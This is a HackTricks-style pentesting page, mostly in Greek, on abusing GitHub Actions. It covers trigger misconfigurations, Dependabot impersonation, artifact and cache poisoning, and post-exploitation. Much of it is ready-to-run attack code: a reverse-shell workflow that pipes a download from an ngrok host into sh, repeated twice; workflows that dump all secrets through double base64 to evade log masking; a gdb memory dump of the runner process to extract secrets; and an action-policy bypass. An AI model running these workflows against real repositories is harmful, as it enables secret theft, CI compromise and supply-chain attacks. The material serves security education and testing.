# Κατάχρηση Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Εργαλεία

The following tools are useful to find Github Action workflows and even find vulnerable ones:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Check also its checklist in [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Βασικές Πληροφορίες

Σε αυτή τη σελίδα θα βρείτε:

- Μια **περίληψη όλων των επιπτώσεων** όταν ένας επιτιθέμενος καταφέρνει να αποκτήσει πρόσβαση σε ένα Github Action
- Διαφορετικοί τρόποι για να **αποκτήσετε πρόσβαση σε ένα action**:
- Έχοντας **δικαιώματα** για να δημιουργήσετε το action
- Κατάχρηση των trigger που σχετίζονται με **pull request**
- Κατάχρηση άλλων τεχνικών **εξωτερικής πρόσβασης**
- **Pivoting** από ένα ήδη παραβιασμένο repo
- Τέλος, μια ενότητα για **post-exploitation techniques** για την κατάχρηση ενός action από μέσα (για να προκαλέσετε τις αναφερθείσες επιπτώσεις)

## Περίληψη Επιπτώσεων

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

Εάν μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε GitHub Actions** μέσα σε ένα **repository**, ενδέχεται να μπορείτε να:

- **Steal secrets** mounted to the pipeline and **abuse the pipeline's privileges** to gain unauthorized access to external platforms, such as AWS and GCP.
- **Compromise deployments** και άλλα **artifacts**.
- Αν το pipeline κάνει deploy ή αποθηκεύει assets, θα μπορούσατε να αλλοιώσετε το τελικό προϊόν, επιτρέποντας μια supply chain attack.
- **Execute code in custom workers** για να καταχραστείτε υπολογιστική ισχύ και να κάνετε pivot σε άλλα συστήματα.
- **Overwrite repository code**, ανάλογα με τα permissions που συνδέονται με το `GITHUB_TOKEN`.

## GITHUB_TOKEN

This "**secret**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is given when the admin enables this option:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

Αυτό το token είναι το ίδιο που θα χρησιμοποιήσει μια **Github Application**, έτσι μπορεί να αποκτήσει πρόσβαση στα ίδια endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Το Github πρέπει να κυκλοφορήσει ένα [**flow**](https://github.com/github/roadmap/issues/74) που **επιτρέπει cross-repository** πρόσβαση εντός του GitHub, ώστε ένα repo να μπορεί να αποκτήσει πρόσβαση σε άλλα εσωτερικά repos χρησιμοποιώντας το `GITHUB_TOKEN`.

Μπορείτε να δείτε τα πιθανά **permissions** αυτού του token στο: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Σημειώστε ότι το token **λήγει μετά την ολοκλήρωση του job**.\
Αυτά τα tokens μοιάζουν έτσι: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Μερικά ενδιαφέροντα πράγματα που μπορείτε να κάνετε με αυτό το token:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Σημειώστε ότι σε αρκετές περιπτώσεις θα μπορείτε να βρείτε **github user tokens μέσα στα Github Actions envs ή στα secrets**. Αυτά τα tokens μπορεί να σας δώσουν περισσότερα προνόμια πάνω στο repository και την organization.

<details>

<summary>Λίστα secrets στην έξοδο του Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Απόκτηση reverse shell με secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Είναι δυνατό να ελεγχθούν τα δικαιώματα που έχει ένα Github Token σε repositories άλλων χρηστών **ελέγχοντας τα logs** των actions:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Επιτρεπτή Εκτέλεση

> [!NOTE]
> Αυτό θα ήταν ο ευκολότερος τρόπος για να compromize τα Github actions, αφού αυτή η περίπτωση προϋποθέτει ότι έχετε πρόσβαση να **create a new repo in the organization**, ή ότι έχετε **write privileges over a repository**.
>
> Εάν βρίσκεστε σε αυτό το σενάριο μπορείτε απλά να δείτε τα [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action).

### Εκτέλεση από δημιουργία Repo

Σε περίπτωση που μέλη μιας organization μπορούν να **create new repos** και εσείς μπορείτε να τρέξετε github actions, μπορείτε να **create a new repo and steal the secrets set at organization level**.

### Εκτέλεση από νέο Branch

Αν μπορείτε να **create a new branch in a repository that already contains a Github Action** διαμορφωμένο, μπορείτε να το **modify**, να **upload** το περιεχόμενο, και μετά να **execute that action from the new branch**. Με αυτόν τον τρόπο μπορείτε να **exfiltrate repository and organization level secrets** (αλλά χρειάζεται να ξέρετε πώς ονομάζονται).

> [!WARNING]
> Οποιος περιορισμός εφαρμόζεται μόνο μέσα στο workflow YAML (για παράδειγμα, `on: push: branches: [main]`, job conditionals, ή manual gates) μπορεί να επεξεργαστεί από collaborators. Χωρίς εξωτερική επιβολή (branch protections, protected environments, and protected tags), ένας contributor μπορεί να στοχεύσει ξανά ένα workflow ώστε να τρέξει στο branch του και να abuse mounted secrets/permissions.

Μπορείτε να κάνετε την τροποποιημένη action εκτελέσιμη **manually,** όταν δημιουργείται ένα **PR** ή όταν **some code is pushed** (ανάλογα με το πόσο noisy θέλετε να είστε):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Εκτέλεση σε Fork

> [!NOTE]
> Υπάρχουν διαφορετικοί ενεργοποιητές που θα μπορούσαν να επιτρέψουν σε έναν επιτιθέμενο να **εκτελέσει ένα Github Action ενός άλλου repository**. Εάν αυτές οι ενεργοποιήσιμες ενέργειες είναι κακώς διαμορφωμένες, ένας επιτιθέμενος θα μπορούσε να τις παραβιάσει.

### `pull_request`

Ο ενεργοποιητής workflow **`pull_request`** θα εκτελεί το workflow κάθε φορά που λαμβάνεται ένα pull request με μερικές εξαιρέσεις: από προεπιλογή, αν είναι η **πρώτη φορά** που συνεργάζεστε, κάποιος **συντηρητής** θα χρειαστεί να **εγκρίνει** την **εκτέλεση** του workflow:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Καθώς ο **προεπιλεγμένος περιορισμός** αφορά συνεργάτες της **πρώτης φοράς**, θα μπορούσατε να συνεισφέρετε διορθώνοντας ένα έγκυρο bug/typo και μετά να στείλετε **άλλα PRs για να κακοποιήσετε τα νέα σας `pull_request` προνόμια**.
>
> **Το δοκίμασα και δεν δουλεύει**: ~~Μια άλλη επιλογή θα ήταν να δημιουργήσεις λογαριασμό με το όνομα κάποιου που συνέβαλε στο project και να διαγράψεις τον λογαριασμό του.~~

Επιπλέον, από προεπιλογή **αποτρέπονται δικαιώματα εγγραφής** και **η πρόσβαση σε secrets** στο target repository όπως αναφέρεται στα [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

Ένας επιτιθέμενος μπορεί να τροποποιήσει τον ορισμό του Github Action ώστε να εκτελέσει αυθαίρετες ενέργειες και να προσθέσει αυθαίρετα actions. Ωστόσο, δεν θα καταφέρει να κλέψει secrets ή να αντικαταστήσει το repo λόγω των αναφερόμενων περιορισμών.

> [!CAUTION]
> **Ναι, αν ο επιτιθέμενος αλλάξει στο PR το github action που θα ενεργοποιηθεί, το Github Action του θα είναι αυτό που θα χρησιμοποιηθεί και όχι αυτό από το origin repo!**

Καθώς ο επιτιθέμενος ελέγχει επίσης τον κώδικα που εκτελείται, ακόμα και αν δεν υπάρχουν secrets ή δικαιώματα εγγραφής στο `GITHUB_TOKEN`, ο επιτιθέμενος θα μπορούσε, για παράδειγμα, να **ανεβάσει κακόβουλα artifacts**.

### **`pull_request_target`**

Ο ενεργοποιητής workflow **`pull_request_target`** έχει **δικαίωμα εγγραφής** στο target repository και **πρόσβαση σε secrets** (και δεν ζητάει έγκριση).

Σημειώστε ότι ο ενεργοποιητής workflow **`pull_request_target`** **τρέχει στο base context** και όχι σε αυτό που παρέχεται από το PR (για να **μην εκτελεστεί μη αξιόπιστος κώδικας**). Για περισσότερες πληροφορίες σχετικά με το `pull_request_target` [**διαβάστε τα docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Επιπλέον, για περισσότερες πληροφορίες σχετικά με αυτή την συγκεκριμένη επικίνδυνη χρήση δείτε αυτό το [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Μπορεί να φαίνεται ότι επειδή το **εκτελούμενο workflow** είναι αυτό που ορίζεται στο **base** και όχι στο PR, είναι **ασφαλές** να χρησιμοποιείται **`pull_request_target`**, αλλά υπάρχουν μερικές περιπτώσεις όπου δεν είναι.

Και αυτό θα έχει **πρόσβαση σε secrets**.

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger allows to run a workflow from a different one when it's `completed`, `requested` or `in_progress`.

In this example, a workflow is configured to run after the separate "Run Tests" workflow completes:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Επιπλέον, σύμφωνα με την τεκμηρίωση: Το workflow που ξεκινάται από το συμβάν `workflow_run` μπορεί να **προσπελάσει secrets και να εγγράψει tokens, ακόμη κι αν το προηγούμενο workflow δεν είχε αυτή τη δυνατότητα**.

Αυτός ο τύπος workflow θα μπορούσε να επιτεθεί αν εξαρτάται από ένα **workflow** που μπορεί να **triggered** από έναν εξωτερικό χρήστη μέσω **`pull_request`** ή **`pull_request_target`**. Μερικά ευάλωτα παραδείγματα μπορούν να [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Το πρώτο αφορά ένα `workflow_run` triggered workflow που κατεβάζει τον κώδικα του επιτιθέμενου: `${{ github.event.pull_request.head.sha }}`\
Το δεύτερο αφορά το passing ενός **artifact** από τον **μη αξιόπιστο** κώδικα στο **`workflow_run`** workflow και τη χρήση του περιεχομένου αυτού του artifact με τρόπο που το καθιστά **vulnerable to RCE**.

### `workflow_call`

TODO

TODO: Έλεγχος αν όταν εκτελείται από `pull_request` ο χρησιμοποιούμενος/κατεβασμένος κώδικας προέρχεται από το origin ή από το forked PR

## Κατάχρηση Εκτέλεσης από Fork

Έχουμε αναφέρει όλους τους τρόπους με τους οποίους ένας εξωτερικός επιτιθέμενος μπορεί να καταφέρει να εκτελέσει ένα github workflow. Ας δούμε τώρα πώς αυτές οι εκτελέσεις, εάν είναι λάθος διαμορφωμένες, μπορούν να καταχραστούν:

### Εκτέλεση μη αξιόπιστου checkout

Στην περίπτωση του **`pull_request`,** το workflow θα εκτελεστεί στο **πλαίσιο του PR** (οπότε θα εκτελέσει τον **κακόβουλο κώδικα του PR**), αλλά κάποιος πρέπει να **το εγκρίνει πρώτα** και θα τρέξει με κάποιους [περιορισμούς](#pull_request).

Σε περίπτωση ενός workflow που χρησιμοποιεί **`pull_request_target` or `workflow_run`** και εξαρτάται από ένα workflow που μπορεί να ενεργοποιηθεί από **`pull_request_target` ή `pull_request`**, ο κώδικας από το αρχικό repo θα εκτελεστεί, οπότε ο **επιτιθέμενος δεν μπορεί να ελέγξει τον εκτελούμενο κώδικα**.

> [!CAUTION]
> Ωστόσο, αν η **action** έχει ένα **explicit PR checkout** που θα **πάρει τον κώδικα από το PR** (και όχι από το base), θα χρησιμοποιήσει τον κώδικα που ελέγχεται από τον επιτιθέμενο. Για παράδειγμα (έλεγξε τη γραμμή 12 όπου ο κώδικας του PR κατεβαίνει):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Ο πιθανώς **μη αξιόπιστος κώδικας εκτελείται κατά τη διάρκεια των `npm install` ή `npm build`**, καθώς τα build scripts και τα αναφερόμενα **packages ελέγχονται από τον συγγραφέα του PR**.

> [!WARNING]
> Ένα github dork για να αναζητήσετε ευάλωτες actions είναι: `event.pull_request pull_request_target extension:yml` ωστόσο, υπάρχουν διαφορετικοί τρόποι να ρυθμίσετε τα jobs ώστε να εκτελούνται με ασφάλεια ακόμα κι αν η action είναι ανασφαλώς διαμορφωμένη (π.χ. χρησιμοποιώντας conditionals σχετικά με το ποιος είναι ο actor που δημιουργεί το PR).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Σημειώστε ότι υπάρχουν ορισμένα [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) των οποίων οι τιμές είναι **ελεγχόμενες** από τον **user** που δημιουργεί το PR. Εάν η github action χρησιμοποιεί αυτά τα **data για να εκτελέσει οτιδήποτε**, αυτό θα μπορούσε να οδηγήσει σε **arbitrary code execution:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### Ενέσεις Script στο GITHUB_ENV <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Από την τεκμηρίωση: Μπορείτε να κάνετε μια **μεταβλητή περιβάλλοντος διαθέσιμη σε οποιαδήποτε επακόλουθα βήματα** σε ένα workflow job ορίζοντας ή ενημερώνοντας τη μεταβλητή περιβάλλοντος και γράφοντάς την στο αρχείο περιβάλλοντος **`GITHUB_ENV`**.

Εάν ένας επιτιθέμενος μπορούσε να **εισάγει οποιαδήποτε τιμή** μέσα σε αυτή τη μεταβλητή **env**, θα μπορούσε να εισάγει μεταβλητές περιβάλλοντος που θα μπορούσαν να εκτελέσουν κώδικα σε επόμενα βήματα όπως **LD_PRELOAD** ή **NODE_OPTIONS**.

Για παράδειγμα ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) και [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), φανταστείτε ένα workflow που εμπιστεύεται ένα ανεβασμένο artifact για να αποθηκεύσει το περιεχόμενό του μέσα στη μεταβλητή env **`GITHUB_ENV`**. Ένας επιτιθέμενος θα μπορούσε να ανεβάσει κάτι σαν αυτό για να το παραβιάσει:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

Όπως αναφέρεται σε [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), αρκετές οργανώσεις έχουν μια Github Action που συγχωνεύει οποιοδήποτε PR από `dependabot[bot]` όπως στο:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Αυτό αποτελεί πρόβλημα επειδή το πεδίο `github.actor` περιέχει τον χρήστη που προκάλεσε το τελευταίο event που ενεργοποίησε το workflow. Υπάρχουν αρκετοί τρόποι για να κάνεις τον χρήστη `dependabot[bot]` να τροποποιήσει ένα PR. Για παράδειγμα:

- Κάνε Fork στο αποθετήριο-θύμα
- Πρόσθεσε το malicious payload στο αντίγραφό σου
- Ενεργοποίησε το Dependabot στο fork σου προσθέτοντας μια ξεπερασμένη dependency. Το Dependabot θα δημιουργήσει ένα branch που διορθώνει την dependency με malicious code.
- Άνοιξε ένα Pull Request προς το αποθετήριο-θύμα από εκείνο το branch (το PR θα δημιουργηθεί από τον χρήστη, οπότε τίποτα δεν θα συμβεί ακόμα)
- Στη συνέχεια, ο επιτιθέμενος επιστρέφει στο αρχικό PR που άνοιξε το Dependabot στο fork του και τρέχει `@dependabot recreate`
- Τότε, το Dependabot εκτελεί κάποιες ενέργειες σε εκείνο το branch, οι οποίες τροποποίησαν το PR στο αποθετήριο-θύμα, κάτι που κάνει τον `dependabot[bot]` actor του τελευταίου event που ενεργοποίησε το workflow (και επομένως, το workflow εκτελείται).

Συνεχίζοντας, τι γίνεται αν αντί για συγχώνευση το GitHub Action έχει μια command injection όπως στο:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Λοιπόν, το αρχικό blogpost προτείνει δύο επιλογές για την κατάχρηση αυτής της συμπεριφοράς, με τη δεύτερη να είναι:

- Κάντε fork στο victim repository και ενεργοποιήστε το Dependabot με κάποια outdated dependency.
- Δημιουργήστε ένα νέο branch με τον κακόβουλο κώδικα shell injection.
- Αλλάξτε το default branch του repo σε αυτό.
- Δημιουργήστε ένα PR από αυτό το branch προς το victim repository.
- Τρέξτε `@dependabot merge` στο PR που άνοιξε το Dependabot στο fork του.
- Το Dependabot θα συγχωνεύσει τις αλλαγές του στο default branch του forked repository σας, ενημερώνοντας το PR στο victim repository και καθιστώντας τώρα το `dependabot[bot]` τον actor του τελευταίου event που πυροδότησε το workflow και χρησιμοποιώντας ένα κακόβουλο όνομα branch.

### Vulnerable Third Party Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Όπως αναφέρεται σε [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), αυτή η Github Action επιτρέπει την πρόσβαση σε artifacts από διαφορετικά workflows και ακόμη repositories.

Το πρόβλημα είναι ότι αν ο παράμετρος **`path`** δεν έχει οριστεί, το artifact αποσυμπιέζεται στον τρέχοντα κατάλογο και μπορεί να αντικαταστήσει αρχεία που ενδέχεται να χρησιμοποιηθούν αργότερα ή ακόμα και να εκτελεστούν στο workflow. Επομένως, αν το Artifact είναι ευάλωτο, ένας επιτιθέμενος θα μπορούσε να το καταχραστεί για να συμβιβάσει άλλα workflows που εμπιστεύονται το Artifact.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Αυτό μπορεί να επιτεθεί με αυτό το workflow:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Άλλη Εξωτερική Πρόσβαση

### Deleted Namespace Repo Hijacking

If an account changes it's name another user could register an account with that name after some time. If a repository had **less than 100 stars previously to the change of nam**e, Github will allow the new register user with the same name to create a **repository with the same name** as the one deleted.

> [!CAUTION]
> Έτσι, αν ένα action χρησιμοποιεί ένα repo από έναν μη-υπάρχον account, εξακολουθεί να είναι πιθανό ότι ένας attacker θα μπορούσε να δημιουργήσει αυτόν τον account και να compromise το action.

If other repositories where using **dependencies from this user repos**, an attacker will be able to hijack them Here you have a more complete explanation: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> Σε αυτή την ενότητα θα μιλήσουμε για τεχνικές που θα επιτρέπουν να **pivot from one repo to another** υποθέτοντας ότι έχουμε κάποιο είδος πρόσβασης στο πρώτο (δείτε την προηγούμενη ενότητα).

### Cache Poisoning

A cache is maintained between **wokflow runs in the same branch**. Which means that if an attacker **compromise** a **package** that is then stored in the cache and **downloaded** and executed by a **more privileged** workflow he will be able to **compromise** also that workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows could use **artifacts from other workflows and even repos**, if an attacker manages to **compromise** the Github Action that **uploads an artifact** that is later used by another workflow he could **compromise the other workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

As commented in [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), even if a repository or organization has a policy restricting the use of certain actions, an attacker could just download (`git clone`) and action inside the workflow and then reference it as a local action. As the policies doesn't affect local paths, **the action will be executed without any restriction.**

Παράδειγμα:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### Πρόσβαση σε AWS και GCP μέσω OIDC

Ελέγξτε τις παρακάτω σελίδες:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Πρόσβαση σε secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

Αν εισάγετε περιεχόμενο σε ένα script, είναι χρήσιμο να γνωρίζετε πώς μπορείτε να αποκτήσετε πρόσβαση σε secrets:

- Εάν το secret ή το token είναι ρυθμισμένο ως **environment variable**, μπορεί να προσπελαστεί απευθείας μέσω του environment χρησιμοποιώντας **`printenv`**.

<details>

<summary>Καταγραφή secrets στην έξοδο του Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Απόκτηση reverse shell με secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- Αν το secret χρησιμοποιείται **απευθείας σε μια έκφραση**, το δημιουργημένο shell script αποθηκεύεται **στο δίσκο** και είναι προσβάσιμο.
- ```bash
cat /home/runner/work/_temp/*
```
- Για JavaScript actions τα secrets αποστέλλονται μέσω μεταβλητών περιβάλλοντος
- ```bash
ps axe | grep node
```
- Για μια **custom action**, ο κίνδυνος μπορεί να ποικίλει ανάλογα με το πώς ένα πρόγραμμα χρησιμοποιεί το secret που έλαβε από το **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Εξάγετε όλα τα secrets μέσω του secrets context (collaborator επίπεδο). Ένας contributor με write access μπορεί να τροποποιήσει ένα workflow σε οποιοδήποτε branch για να dump-άρει όλα τα repository/org/environment secrets. Χρησιμοποιήστε διπλό base64 για να παρακάμψετε το GitHub’s log masking και αποκωδικοποιήστε τοπικά:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Decode locally:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Tip: για stealth κατά τη διάρκεια testing, κρυπτογραφήστε πριν την εκτύπωση (openssl είναι προεγκατεστημένο στους GitHub-hosted runners).

### Κατάχρηση Self-hosted runners

Ο τρόπος να βρείτε ποιες **Github Actions εκτελούνται σε μη-github υποδομή** είναι να αναζητήσετε **`runs-on: self-hosted`** στο Github Action configuration yaml.

Οι **Self-hosted** runners μπορεί να έχουν πρόσβαση σε **επιπλέον ευαίσθητες πληροφορίες**, σε άλλα **δικτυακά συστήματα** (vulnerable endpoints στο δίκτυο; metadata service?) ή, ακόμα και αν είναι απομονωμένοι και καταστραφούν, **πάνω από ένα action μπορεί να τρέξει ταυτόχρονα** και η κακόβουλη να **κλέψει τα secrets** της άλλης.

Σε self-hosted runners είναι επίσης δυνατό να αποκτήσετε τα **secrets from the \_Runner.Listener**\_\*\* process\*\*, το οποίο θα περιέχει όλα τα secrets των workflows σε οποιοδήποτε βήμα, κάνοντας dump της μνήμης του:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Δείτε [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Είναι δυνατόν να δημιουργήσετε Github actions που θα **build and store a Docker image inside Github**.\
Ένα παράδειγμα μπορεί να βρεθεί στο παρακάτω αναδιπλούμενο:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Όπως φαίνεται στον προηγούμενο κώδικα, το Github registry φιλοξενείται στο **`ghcr.io`**.

Ένας χρήστης με δικαιώματα ανάγνωσης στο repo θα μπορεί τότε να κατεβάσει το Docker Image χρησιμοποιώντας ένα personal access token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Τότε, ο χρήστης θα μπορούσε να αναζητήσει **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Ευαίσθητες πληροφορίες στα Github Actions logs

Ακόμα και αν το **Github** προσπαθήσει να εντοπίσει **secret values** στα actions logs και να **avoid showing** αυτά, **άλλα ευαίσθητα δεδομένα** που μπορεί να έχουν παραχθεί κατά την εκτέλεση του action δεν θα κρυφτούν. Για παράδειγμα, ένα JWT υπογεγραμμένο με μια μυστική τιμή δεν θα κρυφτεί εκτός αν είναι [ειδικά διαμορφωμένο](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Κάλυψη των ιχνών σας

